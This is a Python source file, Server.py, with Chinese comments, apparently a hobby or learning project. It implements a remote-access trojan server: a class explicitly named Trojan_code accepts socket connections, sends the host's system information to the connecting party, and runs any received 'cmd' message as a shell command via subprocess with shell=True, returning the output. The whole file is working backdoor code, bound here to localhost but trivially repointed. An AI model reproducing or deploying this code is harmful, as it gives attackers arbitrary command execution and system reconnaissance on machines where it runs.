#!/usr/bin/env python
# _*_ coding: utf-8 _*_
# @Time : 2022/7/23 10:05 
# @Author : 201646613 
# @Version：V 1.0
# @File : Server.py
# @desc :
# 导入socket 函数
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from json import loads
from platform import uname as getsysinfo
from platform import system as getsysname
import subprocess


class Server:
    _conn_pool = {}

    def get_sysinfo(self):  # 获取系统信息

        sysinfo = getsysinfo()
        return sysinfo

    def __init__(self):
        self.__host = "127.0.0.1"  # 监听地址
        self.__port = 16220  # 监听端口
        self.__listen = socket(AF_INET, SOCK_STREAM)  # 创建套接字
        self.__listen.bind((self.__host, self.__port))  # 套接字绑定地址
        self.__listen.listen(10)  # 监听10个链接请求
        self.__listen.settimeout(600)
        self.accept_client()

    def accept_client(self):
        """
        接收新连接
        """
        while True:
            client, info = self.__listen.accept()  # 阻塞，等待客户端连接
            # 给每个客户端创建一个独立的线程进行管理
            thread = Thread(target=Trojan_code, args=(client, info))
            # 设置成守护线程
            thread.setDaemon(True)
            thread.start()

    @classmethod
    def remove_client(self, client_name):  # 删除连接
        client = self._conn_pool[client_name]
        if None != client:
            client.close()
            self._conn_pool.pop(client_name)


class Trojan_code():  # 木马核心代码  实现命令接受 执行 发送结果
    def __init__(self, client, info):  # 接受一个客户端的连接
        self.__client = client
        self.__info = info
        # print("接收到消息")
        self.__client_name = client.recv(1024).decode(encoding='utf8')
        Server._conn_pool[self.__client_name] = client  # 将会话加入线程组
        self.__client.sendall(
            (str(self.__client_name) + "  connect server successfully!").encode(encoding='utf8'))  # 发送连接成功信息
        self.__client.sendall(str(getsysinfo()).encode("utf-8"))  # 发送系统信息

        print("{} 已上线".format(self.__client_name))
        # print(Server._conn_pool)
        # print("退出")
        # Server.remove_client(client_name)
        self.main()

    def cmd_exec(self, data):  # cmd 执行

        p = subprocess.Popen("{}".format(data), shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
        p.wait()
        out = p.stdout.read()
        # print("执行结果".format(out))
        self.__client.send(out)
        p.stdout.close()

    def main(self):
        while True:
            try:
                message = self.__client.recv(1024).decode(encoding='utf8')  # 接受输入
                if message == "":
                    continue
                # print("收到{}".format(message))
                js = loads(message)  # json 消息转化为 python对象
                fun = js['type']  # 查询函数信息
                if fun == 'cmd':  # 函数为cmd时
                    # print("cmd 函数")
                    self.cmd_exec(js['data'])  # 执行cmd函数

            except Exception as e:
                Server.remove_client(self.__client_name)
                print("{} 已下线".format(self.__client_name))
                break


t = Server()
